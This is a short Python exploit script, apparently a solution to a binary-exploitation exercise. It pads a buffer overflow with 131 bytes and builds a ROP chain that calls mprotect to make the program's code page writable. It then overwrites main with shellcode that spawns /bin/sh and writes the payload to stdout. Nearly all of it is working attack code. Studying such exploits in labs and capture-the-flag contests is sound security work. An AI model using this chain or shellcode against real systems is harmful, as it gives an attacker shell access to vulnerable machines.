#!/usr/bin/env python3
import sys
from common import *


def cool_stuff():
    # please see shellcode.asm.
    shellcode = b"jhH\xb8%bin///sH\x83\xc0\nPT_1\xf6\x99j1\x80\x04$\nX\x0f\x05"

    # make main writable
    page_start = 0x400000 # start of the page containing .text
    page_size  = 0x1000
    addr_main  = 0x400809
    rop = call_libc_chain("getline", "mprotect",
                          rdi = page_start,
                          rsi = 0x1000,
                          rdx = 0b111)
    rop += arbitrary_write_chain(addr_main, shellcode)
    rop += int2bytes(addr_main)

    rop = b"\x00" * 131 + rop + b"\n"
    sys.stdout.buffer.write(rop)


if __name__ == "__main__":
    cool_stuff()
